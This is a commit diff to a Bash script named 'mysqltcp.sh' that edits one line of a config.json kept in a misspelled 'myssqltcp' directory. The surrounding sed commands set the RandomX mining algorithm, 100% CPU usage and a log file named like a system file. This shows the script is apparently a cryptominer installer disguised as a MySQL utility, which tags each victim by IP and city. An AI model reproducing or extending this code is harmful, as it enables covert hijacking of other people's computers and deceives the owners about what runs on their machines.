3a2bd9284fa0d44600a9eb50f8a3dddd95be9b4f
teshushu <905353149@qq.com>
2023-01-24 09:28:14 +0800

    Update mysqltcp.sh

--- Bash/mysqltcp.sh
+++ Bash/mysqltcp.sh
@@ -727,7 +727,7 @@ if [ ! -z $EMAIL ]; then
 fi
 
 sed -i 's/"null": *"[^"]*",/"null": "rx/0",/' $HOME/myssqltcp/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$UUID'-'$MEIP':'$UUIP'.'$CITY':'$PASS'",/' $HOME/myssqltcp/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$UUID':'$MEIP':'$UUIP'.'$CITY':'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqlsys.log'",#' $HOME/myssqltcp/config.json
